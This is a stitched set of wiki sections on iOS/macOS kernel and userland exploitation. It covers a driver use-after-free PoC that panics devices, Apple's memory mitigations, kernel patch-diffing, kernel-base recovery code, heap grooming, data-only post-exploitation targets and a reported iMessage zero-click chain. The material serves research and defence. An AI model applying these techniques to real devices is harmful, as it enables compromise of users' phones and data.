text: ## Interpreting the MTE panic On the tested iOS 26.3 build, the access through `request + 0x80` produces a kernel tag-check fault. The stale pointer carries the tag of the old allocation, while the freed or recycled granule no longer has the matching allocation tag. See [Memory Tagging Extension (MTE)](../common-binary-protections-and-bypasses/memory-tagging-extension-mte.md) for the tag-checking model. The panic is strong evidence of a lifetime violation, but it does not by itself prove control of the replacement allocation.<sup>[[2]](#references)[[3]](#references)</sup> Apple states that the flaw may cause unexpected system termination or a kernel-memory write and that it was fixed with improved memory management in iOS/iPadOS 26.4. The published application demonstrates the termination path. It does **not** demonstrate reliable same-zone reclaim, an arbitrary kernel read/write primitive, privilege escalation or kernel code execution.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Reproduction workflow (ios-driver-embedded-queue-node-uaf)
text: ## Reproduction workflow > [!CAUTION] > This test intentionally kernel-panics an affected physical device. Save work first and do not run it on a production device. The published reproduction procedure is:<sup>[[2]](#references)[[3]](#references)</sup> 1. Open `ios-app/Test.xcodeproj` from the PoC repository in Xcode. 2. Build the application for a physical device. The simulator does not expose this kernel driver path. 3. On an affected build, tap **Panic**. The application opens `AppleJPEGDriver`, submits concurrent asynchronous decode requests and closes the connections. 4. Wait for the spray to finish, then open Camera. On the tested iOS 26.3 build this drives the later synchronous decode and deferred panic. For controlled analysis, record the panic log and correlate the faulting `AppleJPEGDriver` PC with the queue walk. Track each request by allocation address, embedded-node address and codec vector. This makes it possible to distinguish the original free from the later stale dereference.<sup>[[3]](#references)</sup>

title: HT: Audit and exploit-development checklist (ios-driver-embedded-queue-node-uaf)
text: ## Audit and exploit-development checklist The write-up and implementation support the following review checks.<sup>[[2]](#references)[[3]](#references)</sup> - Find intrusive `queue_entry`, list-node or vector elements stored at a non-zero offset inside a larger allocation. - Check normal completion, timeout and user-client close paths for the same node and owner. - Compare synchronization domains. A state bit set under an arbitration lock but consumed under a command gate can invalidate cleanup assumptions. - Verify that freeing the owner and erasing the node are one state transition, or that a queue-held reference prevents the free. - Reproduce deferred paths by separating the **priming client** from the **triggering client or subsystem**. - When type isolation is present, test same-type reclaim before generic byte sprays. The PoC contains an experimental victim/reclaimer mode that allocates new `JpegRequest` objects after closing the victim; it does not claim a stable exploit primitive.<sup>[[3]](#references)</sup> Related iOS kernel heap techniques are covered in [iOS Physical Use After Free via IOSurface](ios-physical-uaf-iosurface.md).

title: HT: iOS Exploit Mitigations <sup>[[11]](#references)</sup> (README)
text: ## iOS Exploit Mitigations <sup>[[11]](#references)</sup> ### 1. **Code Signing** / Runtime Signature Verification **Introduced early (iPhone OS → iOS)** This is one of the fundamental protections: **all executable code** (apps, dynamic libraries, JIT-ed code, extensions, frameworks, caches) must be cryptographically signed by a certificate chain rooted in Apple’s trust. At runtime, before loading a binary into memory (or before performing jumps across certain boundaries), the system checks its signature. If the code is modified (bit-flipped, patched) or unsigned, the load fails. - **Thwarts**: the “classic payload drop + execute” stage in exploit chains; arbitrary code injection; modifying an existing binary to insert malicious logic. - **Mechanism detail**: * The Mach-O loader (and dynamic linker) checks code pages, segments, entitlements, team IDs, and that the signature covers the file’s contents. * For memory regions like JIT caches or dynamically generated code, Apple enforces that pages be signed or validated via special APIs (e.g. `mprotect` with code-sign checks). * The signature includes entitlements and identifiers; the OS enforces that certain APIs or privileged capabilities require specific entitlements that cannot be forged. <details> <summary>Example</summary> Suppose an exploit obtains code execution in a process and tries to write shellcode into a heap and jump to it. On iOS, that page would need to be flagged executable **and** satisfy code-signature constraints. Since the shellcode isn’t signed with Apple’s certificate, the jump fails or the system rejects making that memory region executable. </details> ### 2. **CoreTrust** **Introduced around iOS 14+ era (or gradually in newer devices / later iOS)** CoreTrust is the subsystem that performs **runtime

title: HT: Key enhancements / differences compared to standard MTE (README)
text: ## Key enhancements / differences compared to standard MTE Here are the improvements and changes Apple emphasizes: <sup>[[12]](#references)</sup> | Feature | Original MTE | EMTE (Apple’s enhanced) / MIE | |---|---|---| | **Check mode** | Supports synchronous and asynchronous modes. In async, tag mismatches are reported later (delayed)| Apple insists on **synchronous mode** by default—tag mismatches are caught immediately, no delay/race windows allowed.| | **Coverage of non-tagged memory** | Accesses to non-tagged memory (e.g. globals) may bypass checks in some implementations | EMTE requires that accesses from a tagged region to non-tagged memory also validate tag knowledge, making it harder to bypass by mixing allocations.| | **Tag confidentiality / secrecy** | Tags might be observable or leaked via side channels | Apple adds **Tag Confidentiality Enforcement**, which attempts to prevent leakage of tag values (via speculative side-channels etc.).| | **Allocator integration & retagging** | MTE leaves much of allocator logic to software | Apple’s secure typed allocators (kalloc_type, xzone malloc, etc.) integrate with EMTE: when memory is allocated or freed, tags are managed at fine granularity.| | **Always-on by default** | In many platforms, MTE is optional or off by default | Apple enables EMTE / MIE by default on supported hardware (e.g. iPhone 17 / A19) for kernel and many user processes.| Because Apple controls both the hardware and software stack, it can enforce EMTE tightly, avoid performance pitfalls, and close side-channel holes. ---

title: HT: Exception handling in XNU <sup>[[16]](#references)</sup> (README)
text: ## Exception handling in XNU <sup>[[16]](#references)</sup> When an **exception** occurs (e.g., `EXC_BAD_ACCESS`, `EXC_BAD_INSTRUCTION`, `EXC_CRASH`, `EXC_ARM_PAC`, etc.), the **Mach layer** of the XNU kernel is responsible for intercepting it before it becomes a UNIX-style **signal** (like `SIGSEGV`, `SIGBUS`, `SIGILL`, ...). This process involves multiple layers of exception propagation and handling before reaching user space or being converted to a BSD signal. ### Exception Flow (High-Level) 1. **CPU triggers a synchronous exception** (e.g., invalid pointer dereference, PAC failure, illegal instruction, etc.). 2. **Low-level trap handler** runs (`trap.c`, `exception.c` in XNU source). 3. The trap handler calls **`exception_triage()`**, the core of the Mach exception handling. 4. `exception_triage()` decides how to route the exception: - First to the **thread's exception port**. - Then to the **task's exception port**. - Then to the **host's exception port** (often `launchd` or `ReportCrash`). If none of these ports handle the exception, the kernel may: - **Convert it into a BSD signal** (for user-space processes). - **Panic** (for kernel-space exceptions). ### Core Function: `exception_triage()` The function `exception_triage()` routes Mach exceptions up the chain of possible handlers until one handles it or until it's finally fatal. It's defined in `osfmk/kern/exception.c`. ```c void exception_triage(exception_type_t exception, mach_exception_data_t code, mach_msg_type_number_t codeCnt); ``` **Typical Call Flow:** `exception_triage() └── exception_deliver() ├── exception_deliver_thread() ├── exception_deliver_task() └── exception_deliver_host()` If all fail → handled by `bsd_exception()` → translated into a signal like `SIGSEGV`. ### Exception Ports Each Mach object

title: HT: Old Kernel Heap (Pre-iOS 15 / Pre-A12 era) <sup>[[15]](#references)</sup> (README)
text: ## Old Kernel Heap (Pre-iOS 15 / Pre-A12 era) <sup>[[15]](#references)</sup> The kernel used a **zone allocator** (`kalloc`) divided into fixed-size "zones." Each zone only stores allocations of a single size class. From the screenshot: | Zone Name | Element Size | Example Use | |----------------------|--------------|-----------------------------------------------------------------------------| | `default.kalloc.16` | 16 bytes | Very small kernel structs, pointers. | | `default.kalloc.32` | 32 bytes | Small structs, object headers. | | `default.kalloc.64` | 64 bytes | IPC messages, tiny kernel buffers. | | `default.kalloc.128` | 128 bytes | Medium objects like parts of `OSObject`. | | … | … | … | | `default.kalloc.1280`| 1280 bytes | Large structures, IOSurface/graphics metadata. | **How it worked:** - Each allocation request gets **rounded up** to the nearest zone size. (E.g., a 50-byte request lands in the `kalloc.64` zone). - Memory in each zone was kept in a **free list** — chunks freed by the kernel went back into that zone. - If you overflowed a 64-byte buffer, you’d overwrite the **next object in the same zone**. This is why **heap spraying / feng shui** was so effective: you could predict object neighbors by spraying allocations of the same size class. ### The freelist Inside each kalloc zone, freed objects weren’t returned directly to the system — they went into a freelist, a linked list of available chunks. - When a chunk was freed, the kernel wrote a pointer at the start of that chunk → the address of the next free chunk in the same zone. - The zone kept a HEAD pointer to the first free chunk. - Allocation always used the current HEAD: 1. Pop HEAD (return that memory to the caller). 2. Update HEAD = HEAD->next (stored in the freed chunk’s header). - Freeing p

title: HT: Modern Kernel Heap (iOS 15+/A12+ SoCs) (README)
text: ## Modern Kernel Heap (iOS 15+/A12+ SoCs) Apple hardened the allocator and made **heap grooming much harder**: <sup>[[12]](#references)</sup> ### 1. From Classic kalloc to kalloc_type - **Before**: a single `kalloc.<size>` zone existed for each size class (16, 32, 64, … 1280, etc.). Any object of that size was placed there → attacker objects could sit next to privileged kernel objects. - **Now**: - Kernel objects are allocated from **typed zones** (`kalloc_type`). - Each type of object (e.g., `ipc_port_t`, `task_t`, `OSString`, `OSData`) has its own dedicated zone, even if they’re the same size. - The mapping between object type ↔ zone is generated from the **kalloc_type system** at compile time. An attacker can no longer guarantee that controlled data (`OSData`) ends up adjacent to sensitive kernel objects (`task_t`) of the same size. ### 2. Slabs and Per-CPU Caches - The heap is divided into **slabs** (pages of memory carved into fixed-size chunks for that zone). - Each zone has a **per-CPU cache** to reduce contention. - Allocation path: 1. Try per-CPU cache. 2. If empty, pull from the global freelist. 3. If freelist is empty, allocate a new slab (one or more pages). - **Benefit**: This decentralization makes heap sprays less deterministic, since allocations may be satisfied from different CPUs’ caches. ### 3. Randomization inside zones - Within a zone, freed elements are not handed back in simple FIFO/LIFO order. - Modern XNU uses **encoded freelist pointers** (safe-linking like Linux, introduced ~iOS 14). - Each freelist pointer is **XOR-encoded** with a per-zone secret cookie. - This prevents attackers from forging a fake freelist pointer if they gain a write primitive. - Some allocations are **randomized in their placement within a slab**, so spraying doesn’t gua

title: HT: Comparison Table   (README)
text: ## Comparison Table | Feature | **Old Heap (Pre-iOS 15)** | **Modern Heap (iOS 15+ / A12+)** | |---------------------------------|------------------------------------------------------------|--------------------------------------------------| | Allocation granularity | Fixed size buckets (`kalloc.16`, `kalloc.32`, etc.) | Size + **type-based buckets** (`kalloc_type`) | | Placement predictability | High (same-size objects side by side) | Low (same-type grouping + randomness) | | Freelist management | Raw pointers in freed chunks (easy to corrupt) | **Encoded pointers** (safe-linking style) | | Adjacent object control | Easy via sprays/frees (feng shui predictable) | Hard — typed zones separate attacker objects | | Kernel data/code protections | Few hardware protections | **PPL / SPTM** protect page tables & code pages, and **PAC** protects pointers | | Allocation reuse validation | None (freelist pointers raw) | **zone_require / zone enforcement** | | Exploit reliability | High with heap sprays | Much lower, requires logic bugs or info leaks | | Large allocations handling | All small allocations managed equally | Large ones bypass zones → handled via VM | ---

title: HT: Modern Userland Heap (iOS, macOS — type-aware / xzone malloc) <sup>[[12]](#references)</sup> (README)
text: ## Modern Userland Heap (iOS, macOS — type-aware / xzone malloc) <sup>[[12]](#references)</sup> In recent Apple OS versions (especially iOS 17+), Apple introduced a more secure userland allocator, **xzone malloc** (XZM). This is the user-space analog to the kernel’s `kalloc_type`, applying type awareness, metadata isolation, and memory tagging safeguards. <sup>[[12]](#references)</sup> ### Goals & Design Principles - **Type segregation / type awareness**: group allocations by *type or usage (pointer vs data)* to prevent type confusion and cross-type reuse. - **Metadata isolation**: separate heap metadata (e.g. free lists, size/state bits) from object payloads so that out-of-bounds writes are less likely to corrupt metadata. - **Guard pages / redzones**: insert unmapped pages or padding around allocations to catch overflows. - **Memory tagging (EMTE / MIE)**: work in conjunction with hardware tagging to detect use-after-free, out-of-bounds, and invalid accesses. - **Scalable performance**: maintain low overhead, avoid excessive fragmentation, and support many allocations per second with low latency. ### Architecture & Components Below are the main elements in the xzone allocator: #### Segment Groups & Zones - **Segment groups** partition the address space by usage categories: e.g. `data`, `pointer_xzones`, `data_large`, `pointer_large`. - Each segment group contains **segments** (VM ranges) that host allocations for that category. - Associated with each segment is a **metadata slab** (separate VM area) that stores metadata (e.g. free/used bits, size classes) for that segment. This **out-of-line (OOL) metadata** ensures that metadata is not intermingled with object payloads, mitigating corruption from overflows. - Segments are carved into **chunks** (slices) which in turn

title: HT: Ghidra Install BinDiff (README)
text: ## Ghidra Install BinDiff Download BinDiff DMG from [https://www.zynamics.com/bindiff/manual](https://www.zynamics.com/bindiff/manual) and install it. Open Ghidra with `ghidraRun`, go to `File` → `Install Extensions`, press the add button, select `/Applications/BinDiff/Extra/Ghidra/BinExport`, and install it. The original workflow continues past Ghidra's version-mismatch warning; verify compatibility carefully because an unsupported Ghidra/BinExport combination may still fail at runtime. ### Using BinDiff with Kernel versions 1. Go to the page [https://ipsw.me/](https://ipsw.me/) and download the iOS versions you want to diff. These will be `.ipsw` files. 2. Decompress until you get the bin format of the kernelcache of both `.ipsw` files. You have information on how to do this on: {{#ref}} ../../macos-hardening/macos-security-and-privilege-escalation/mac-os-architecture/macos-kernel-extensions.md {{#endref}} 3. Open Ghidra with `ghidraRun`, create a new project and load the kernelcaches. 4. Open each kernelcache so they are automatically analyzed by Ghidra. 5. Then, on the project Window of Ghidra, right click each kernelcache, select `Export`, select format `Binary BinExport (v2) for BinDiff` and export them. 6. Open BinDiff, create a new workspace and add a new diff indicating as primary file the kernelcache that contains the vulnerability and as secondary file the patched kernelcache. ---

title: HT: Finding the right XNU version (README)
text: ## Finding the right XNU version To research a specific iOS version, first identify its corresponding XNU release in [The iPhone Wiki's archived kernel table](https://web.archive.org/web/20260713091137/https://www.theiphonewiki.com/wiki/Kernel).<sup>[[17]](#references)</sup> For example, the versions `15.1 RC`, `15.1` and `15.1.1` use the version `Darwin Kernel Version 21.1.0: Wed Oct 13 19:14:48 PDT 2021; root:xnu-8019.43.1~1/RELEASE_ARM64_T8006`.

title: HT: Recovering XNU object offsets from stripped ARM64 kernelcaches (README)
text: ## Recovering XNU object offsets from stripped ARM64 kernelcaches A kernel read/write primitive is not sufficient by itself: post-exploitation code still needs the target build's kernel slide, global anchors and object layouts. Treat every recovered address and field offset as **build-specific**. Public XNU source is a naming and relationship map, while the shipped kernelcache is the ground truth; Apple can insert, remove or split fields (for example into `proc_ro`) without preserving another release's layout.<sup>[[18]](#references)[[19]](#references)</sup> ### Prepare the image and normalize addresses Extract the target IPSW's kernelcache, load the decrypted Mach-O/fileset in Binary Ninja, IDA or Ghidra, and optionally apply [`symbolicator`](https://github.com/blacktop/symbolicator) signatures before manual analysis.<sup>[[18]](#references)[[20]](#references)[[21]](#references)</sup> ```bash ipsw extract --kernel /path/to/Restore.ipsw ``` Given a kernel-read primitive and any known live kernel pointer, walk backward through readable, page-aligned kernel memory until the first eight Mach-O header bytes equal `0x100000cfeedfacf` (`MH_MAGIC_64` plus ARM64 CPU type in little-endian order). This finds the **live** kernel Mach-O base. Calculate `slide = live_base - static_vm_base`, then translate a static disassembler address with `live = static + slide`. Relative structure offsets do not change with KASLR.<sup>[[18]](#references)</sup> ```c uint64_t page_size = target_kernel_page_size; for (uint64_t p = leaked_kptr & ~(page_size - 1); ; p -= page_size) { if (early_kread64(p) == 0x100000cfeedfacf) { live_base = p; break; } } slide = live_base - static_vm_base; ``` > [!CAUTION] > Only probe ranges that the primitive can read safely; an unmapped or invalid kernel access may p

title: HT: iOS Exploit Mitigations <sup>[[4]](#references)</sup> (ios-physical-uaf-iosurface)
text: ## iOS Exploit Mitigations <sup>[[4]](#references)</sup> - **Code Signing** in iOS works by requiring every piece of executable code (apps, libraries, extensions, etc.) to be cryptographically signed with a certificate issued by Apple. When code is loaded, iOS verifies the digital signature against Apple’s trusted root. If the signature is invalid, missing, or modified, the OS refuses to run it. This prevents attackers from injecting malicious code into legitimate apps or running unsigned binaries, effectively stopping most exploit chains that rely on executing arbitrary or tampered code. - **CoreTrust** is the iOS subsystem responsible for enforcing code signing at runtime. It directly verifies signatures using Apple’s root certificate without relying on cached trust stores, meaning only binaries signed by Apple (or with valid entitlements) can execute. CoreTrust ensures that even if an attacker tampers with an app after installation, modifies system libraries, or tries to load unsigned code, the system will block execution unless the code is still properly signed. This strict enforcement closes many post-exploitation vectors that older iOS versions allowed through weaker or bypassable signature checks. - **Data Execution Prevention (DEP)** marks memory regions as non-executable unless they explicitly contain code. This stops attackers from injecting shellcode into data regions (like the stack or heap) and running it, forcing them to rely on more complex techniques like ROP (Return-Oriented Programming). - **ASLR (Address Space Layout Randomization)** randomizes the memory addresses of code, libraries, stack, and heap every time the system runs. title: HT: Physical use-after-free (ios-physical-uaf-iosurface)
text: ## Physical use-after-free This section summarizes Alfie C.G.'s kernel-exploitation writeup. Additional implementations and notes are available in the `kfd` repository.[[1]](#references)[[2]](#references) ### Memory management in XNU The **virtual memory address space** for user processes on iOS spans from **0x0 to 0x8000000000**. However, these addresses don’t directly map to physical memory. Instead, the **kernel** uses **page tables** to translate virtual addresses into actual **physical addresses**. #### Levels of Page Tables in iOS Page tables are organized hierarchically in three levels: 1. **L1 Page Table (Level 1)**: * Each entry here represents a large range of virtual memory. * It covers **0x1000000000 bytes** (or **256 GB**) of virtual memory. 2. **L2 Page Table (Level 2)**: * An entry here represents a smaller region of virtual memory, specifically **0x2000000 bytes** (32 MB). * An L1 entry may point to an L2 table if it can't map the entire region itself. 3. **L3 Page Table (Level 3)**: * This is the finest level, where each entry maps a single **4 KB** memory page. * An L2 entry may point to an L3 table if more granular control is needed. #### Mapping Virtual to Physical Memory * **Direct Mapping (Block Mapping)**: * Some entries in a page table directly **map a range of virtual addresses** to a contiguous range of physical addresses (like a shortcut). * **Pointer to Child Page Table**: * If finer control is needed, an entry in one level (e.g., L1) can point to a **child page table** at the next level (e.g., L2). #### Example: Mapping a Virtual Address Let’s say you try to access the virtual address **0x1000000000**: 1. **L1 Table**: * The kernel checks the L1 page

title: HT: Scope and confidence (xnu-vm-map-cow-vnode-toctou)
text: ## Scope and confidence Google Threat Intelligence confirmed that DarkSword chained a `vm_map` copy-on-write bug (CVE-2025-43510) into an arbitrary-call primitive in `mediaplaybackd`, then used a VFS race (CVE-2025-43520) to obtain physical and virtual kernel read/write. Apple describes the observable impacts as unexpected cross-process shared-memory changes and kernel-memory writes. Both primary sources place the fixes in **iOS/iPadOS 18.7.2 and 26.1**.<sup>[[1]](#references)[[2]](#references)</sup> > [!WARNING] > The vulnerable routines, message geometry, vnode operation and final primitive conversion have not been published. The exploitation details below are an **audit and exploit-development model**, not a reconstruction of DarkSword. The secondary analysis that proposed this model also labels it illustrative.<sup>[[10]](#references)</sup>

title: HT: Mach OOL COW aliasing (xnu-vm-map-cow-vnode-toctou)
text: ## Mach OOL COW aliasing Mach and XPC transport large out-of-line (OOL) data as `vm_map_copy` objects. Copyout/overwrite code must keep a destination entry's address range, backing `vm_object`, object offset, current/max protections and COW state mutually consistent while maps and objects are locked and unlocked. `vm_map_copy_overwrite_nested()` is one of the paths that overlays a copy on an existing destination range.<sup>[[3]](#references)</sup> For a private writable destination, one of these post-conditions must hold:<sup>[[3]](#references)</sup> 1. the destination owns a detached writable object; or 2. it still shares the source object, but its first write must fault and perform the COW split. A useful audit target is a path where the destination becomes writable/private while retaining the source object **and** no longer has a write-fault path. This creates a writable cross-process alias: stores in the receiving task modify pages still consumed by the sender. Review fast paths, partial-entry clipping, submaps, page-shift conversions, error unwinding and every map-lock drop/reacquisition for invariant changes.<sup>[[3]](#references)[[10]](#references)</sup> ```c /* Invariant-oriented pseudocode, not vulnerable XNU code. */ overwrite(dst_map, dst_addr, copy); if (dst_entry->writable && dst_entry->object == src_entry->object) { assert(dst_entry->needs_copy || object_enforces_symmetric_cow); } assert(dst_entry->offset + entry_size does_not_overflow); assert(object_reference_is_held(dst_entry->object)); ``` ### Turning an alias into a daemon pivot When the compromised process is sandboxed, enumerate its signed `com.apple.security.exception.mach-lookup.global-name` entitlement and prioritize reachable daemons that accept OOL objects and possess more useful Mach/IOKit en

title: HT: VFS temporary-unlock races (xnu-vm-map-cow-vnode-toctou)
text: ## VFS temporary-unlock races XNU path lookup passes reference-counted vnodes through `namei()`/`lookup()`. A vnode includes a mutex, identity/generation state and counters such as `v_kusecount`, `v_usecount` and `v_iocount`; a lock alone is not an ownership reference.<sup>[[4]](#references)[[5]](#references)</sup> Audit any path that performs this sequence:<sup>[[4]](#references)[[5]](#references)</sup> 1. resolve a vnode and validate a property; 2. drop a lock for allocation, `copyin`, filesystem callout, mount traversal or re-lookup; 3. resume with a cached pointer or previously checked field; and 4. dispatch through vnode state without proving that the reference and vnode identity survived. The exploitable condition is not merely an unlock. A path must also lose or omit the reference that prevents recycling, or otherwise allow the checked identity to change. Correct fixes normally retain the required iocount/usecount across the window or revalidate identity and properties after reacquiring the lock.<sup>[[4]](#references)[[5]](#references)[[10]](#references)</sup> ### Same-type replacement under `kalloc_type` Modern XNU segregates typed allocations and isolates pure byte buffers in `KHEAP_DATA_BUFFERS`; the latter is specifically intended for byte bags without pointers or length/offset fields. Consequently, reclaiming a freed vnode with arbitrary pipe bytes is not the expected strategy. Groom the relevant vnode allocation population, create controlled holes, then reclaim with another **vnode** produced through legitimate filesystem operations.<sup>[[6]](#references)[[7]](#references)</sup> A repeatable laboratory strategy is:<sup>[[10]](#references)</sup> - synchronize racing threads with barriers and comparable QoS so the intended syscall reaches the unlock window

title: HT: Primitive ladder and data-only post-exploitation (xnu-vm-map-cow-vnode-toctou)
text: ## Primitive ladder and data-only post-exploitation The modeled ladder uses one small write to corrupt metadata that bounds I/O for an existing data-buffer allocation. Enlarging the recorded length can turn normal reads/writes into an out-of-bounds slab primitive without reclaiming a typed object with raw bytes. Leaks can then be searched for build-specific `proc` signatures (`p_pid`, `p_comm` and list links), followed into task/credential state, and upgraded into stable virtual kernel read/write. Google confirms that DarkSword ultimately built physical and virtual R/W, but has not published this pipe-based conversion.<sup>[[1]](#references)[[10]](#references)</sup> Once kernel R/W exists, modern exploitation can avoid kernel text and direct page-table edits. Build-specific targets include credential IDs, MAC/sandbox policy state, `proc` code-signing flags and task JIT policy. PPL/SPTM protects important executable mappings and page-table transitions, but changing ordinary writable policy data may cause trusted code to authorize later operations without violating those page protections. Exact fields and integrity checks must be recovered for the target build; blindly applying offsets or clearing labels is likely to panic the device.<sup>[[8]](#references)[[10]](#references)</sup>

title: HT: Firmware triage with `ipsw` (xnu-vm-map-cow-vnode-toctou)
text: ## Firmware triage with `ipsw` The [`ipsw`](https://github.com/blacktop/ipsw) workflow can locate firmware, extract only the kernelcache, compare function-start tables, query signed entitlements and recover daemon Objective-C interfaces. Use adjacent vulnerable/patched builds, then map localized binary deltas back to the matching public XNU tag; equal file sizes or unchanged kernel banners do not imply equal code.<sup>[[9]](#references)[[10]](#references)</sup> ```bash ipsw download appledb --os iOS --version "18.7.2" --urls ipsw info --remote --no-color "https://.../Restore.ipsw" ipsw extract --kernel --remote "https://.../Restore.ipsw" ipsw kernel version ./kernelcache.release.* ipsw macho info --fileset-entry com.apple.kernel --starts ./kernelcache.release.* ipsw ent --sqlite ents.db --ipsw ./Restore.ipsw ipsw ent --sqlite ents.db --file mediaplaybackd ``` For generic Mach-O entitlement parsing and large-scale IPSW indexing, see [Mach-O Entitlements Extraction & IPSW Indexing](../../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/mach-o-entitlements-and-ipsw-indexing.md).

title: HT: Detection on research devices (xnu-vm-map-cow-vnode-toctou)
text: ## Detection on research devices Useful correlations are OOL-heavy GPU-to-media-daemon XPC traffic without playback activity; unexpected memory-entry operations by that daemon; short bursts of `open`/`unlink`/`rename` on writable temporary paths combined with pipe allocation; and credential, sandbox or code-signing-state changes without an expected process transition. EndpointSecurity can expose filesystem bursts, while XPC/kernel instrumentation is generally limited to research or otherwise instrumented devices.<sup>[[10]](#references)</sup>

title: HT: iOS/macOS Example Heap Overflow Exploit (ios-example-heap-exploit)
text: # iOS/macOS Example Heap Overflow Exploit {{#include ../../banners/hacktricks-training.md}} This page is a **small Apple-platform heap-overflow lab**: a heap buffer overflow corrupts a callback pointer in the next chunk and turns that primitive into code execution. It is intentionally simple, but it is still useful for practicing **heap grooming, measuring overwrite distances, and reasoning about allocator-specific layout constraints** before moving to real Apple targets. > [!INFO] > Treat this as a **macOS/libmalloc training lab**, not as a claim that current iPhones are still exploitable with a raw `win()` pointer overwrite. For the broader Apple heap / PAC / modern allocator background, see the generic [iOS exploiting notes](README.md). {{#ref}} README.md {{#endref}}

title: HT: Why this example still matters on modern Apple targets (ios-example-heap-exploit)
text: ## Why this example still matters on modern Apple targets - The core skill is still valid: **turn a controllable overflow into a targeted adjacent-object overwrite**. - The important Apple-specific lesson is that **allocator choice matters**. If the overflowing chunk and the target callback land in different libmalloc zones, your overwrite never reaches the target. - `MallocNanoZone=0` is used here only to make the lab reproducible on **macOS userland**. It pushes small allocations away from the Nano allocator so same-process adjacency becomes easier to study. - On **modern iOS / arm64e** targets you must also expect **xzone malloc type isolation** and **PAC-protected control-flow pointers**. In real exploits, the usual next step is not “write an unsigned function address”, but rather **reuse already-signed pointers, corrupt an unsigned pointer one hop earlier, or pivot into callback-oriented / data-only primitives**.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>

title: HT: Calculating the correct overwrite distance (ios-example-heap-exploit)
text: ## Calculating the correct overwrite distance The exploit below brute-forces several candidate paddings, but in a lab you can often measure the exact distance once and then keep the exploit deterministic. A simple temporary instrumentation is enough: ```c printf("[*] buf=%p &h->cb=%p delta=%lld\n", buf, &h->cb, (long long)((char *)&h->cb - buf)); ``` If the printed delta is `560`, the extra padding you need after the first `128` attacker-controlled bytes is: ```text extra_pad = 560 - 128 = 432 ``` This is also a good place to verify when a compiler change, extra logging, different optimization level, or a new macOS release has shifted the heap layout enough to break a previously stable exploit.

title: HT: iMessage Media Parser Zero-Click → CoreAudio RCE → PAC/RPAC → Kernel → CryptoTokenKit Abuse (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: # iMessage Media Parser Zero-Click → CoreAudio RCE → PAC/RPAC → Kernel → CryptoTokenKit Abuse {{#include ../../banners/hacktricks-training.md}} This page summarizes Apple's confirmed impact for CVE-2025-31200 and CVE-2025-31201, followed by an end-to-end exploitation chain **claimed by the cited JGoyd research repository**. Apple confirms CoreAudio code execution from malicious media and an RPAC pointer-authentication bypass for an attacker who already has arbitrary read/write; it does not document the repository's asserted iMessage, Wi-Fi, kernel, or CryptoTokenKit stages.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup> > Warning: This is an educational summary to help defenders, researchers, and red teams understand the techniques. Do not use offensively.

title: HT: High-Level Chain Reported by the Research Repository (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## High-Level Chain Reported by the Research Repository - Delivery vector: a malicious audio attachment (e.g., .amr / MP4 AAC) sent via iMessage/SMS.<sup>[[1]](#references)[[2]](#references)</sup> - Auto-ingestion: iOS auto-parses media for previews and conversions without user interaction. - Parser bug: malformed structures hit CoreAudio’s AudioConverterService and corrupt heap memory. - Code exec in media context: RCE inside the media parsing process; reported to bypass BlastDoor isolation in specific paths (e.g., “known sender” framing path). - PAC/RPAC bypass: once arbitrary R/W is achieved, a PAC bypass in the RPAC path enables stable control flow under arm64e PAC. - Kernel escalation: the chain converts userland exec into kernel exec (e.g., via wireless/AppleBCMWLAN code paths and AMPDU handling as seen in logs below). - Post-exploitation: the repository claims that a BCM4387 hardware pivot permits Bluetooth-identity spoofing, triggers Auto-Unlock evaluation, and invokes CryptoTokenKit/SEP-backed ECDSA signing without an interactive prompt or exporting the key material.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: iMessage/BlastDoor attack surface notes (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## iMessage/BlastDoor attack surface notes BlastDoor is a hardened service designed to parse untrusted message content. However, observed logs indicate paths where protections may be bypassed when messages are framed from a “known sender” and when additional filters (e.g., Blackhole) are relaxed:<sup>[[1]](#references)</sup> ```text IDSDaemon BlastDoor: Disabled for framing messages SpamFilter Blackhole disabled; user has disabled filtering unknown senders. ``` Takeaways: - Auto-parsing still represents a remote, zero-click attack surface. - Policy/context decisions (known sender, filtering state) can materially change the effective isolation.

title: HT: CoreAudio: AudioConverterService heap corruption (userland RCE) (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## CoreAudio: AudioConverterService heap corruption (userland RCE) Affected component: - CoreAudio → AudioConverterService → AAC/AMR/MP4 parsing and conversion flows Observed parser touchpoint (logs): ```text AudioConverterService ACMP4AACBaseDecoder.cpp: inMagicCookie=0x0, inMagicCookieByteSize=39 ``` Technique summary: - Malformed container/codec metadata (e.g., invalid/short/NULL magic cookie) causes a memory corruption during decode setup. - Triggers in the iMessage media conversion path without taps by the user. - Yields code execution in the media parsing process. The write-up claims this escapes BlastDoor in the observed delivery path, enabling the next stage.<sup>[[1]](#references)[[2]](#references)</sup> Practical tips: - Fuzz AAC/AMR magic cookie and MP4 codec atoms when targeting AudioConverterService conversions. - Focus on heap overflows/underflows, OOB reads/writes, and size/length confusion around decoder initialization.

title: HT: PAC bypass via RPAC path (CVE-2025-31201) (imessage-media-parser-zero-click-coreaudio-pac-bypass)
text: ## PAC bypass via RPAC path (CVE-2025-31201) arm64e Pointer Authentication (PAC) impedes hijacking of return addresses and function pointers. Apple confirms that CVE-2025-31201 could let an attacker with arbitrary read/write bypass Pointer Authentication; the research repository describes how it believes that primitive fits into this chain.<sup>[[2]](#references)[[3]](#references)</sup> Key idea: - With arbitrary R/W, attackers can craft valid, re-signed pointers or pivot execution to PAC-tolerant paths. The so-called “RPAC path” enables control-flow under PAC constraints, turning a userland RCE into a reliable kernel exploit setup.<sup>[[1]](#references)[[2]](#references)</sup> Notes for researchers: - Collect info leaks to defeat KASLR and stabilize ROP/JOP chains even under PAC. - Target callsites that generate or authenticate PAC in controllable ways (e.g., signatures generated on attacker-controlled values, predictable context keys, or gadget sequences that re-sign pointers). - Expect Apple hardening variance by SoC/OS; reliability hinges on leaks, entropy, and robust primitives.

title: HT: Kernel escalation: wireless/AMPDU path example (imessage-media-parser-zero-click-coreaudio-pac-bypass)
